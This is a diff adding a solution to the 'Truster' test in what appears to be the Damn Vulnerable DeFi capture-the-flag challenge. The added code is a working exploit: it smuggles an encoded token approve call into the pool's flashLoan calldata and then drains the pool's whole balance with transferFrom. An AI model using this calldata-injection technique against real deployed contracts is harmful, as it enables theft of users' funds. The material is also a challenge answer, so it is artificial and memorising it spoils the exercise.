@@ -23,6 +23,21 @@ describe('[Challenge] Truster', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        pool_balance = await token.balanceOf(pool.address);
+
+        // const abi = ethers.utils.defaultAbiCoder;
+        // const data = abi.encode(["string", "address", "uint256"], ["approve(address,uint256)", player.address, x.toBigInt()]);
+
+        let ABI = [
+            "function approve(address spender, uint256 amount)"
+        ];
+        let iface = new ethers.utils.Interface(ABI);
+        data = iface.encodeFunctionData("approve", [player.address, pool_balance.toBigInt()])
+
+        console.log("allowance before flashLoan", await token.allowance(pool.address, player.address));
+        await pool.connect(player).flashLoan(0n, player.address, token.address, data);
+        console.log("allowance after flashLoan", await token.allowance(pool.address, player.address));
+        await token.connect(player).transferFrom(pool.address, player.address, token.balanceOf(pool.address))
     });
 
     after(async function () {
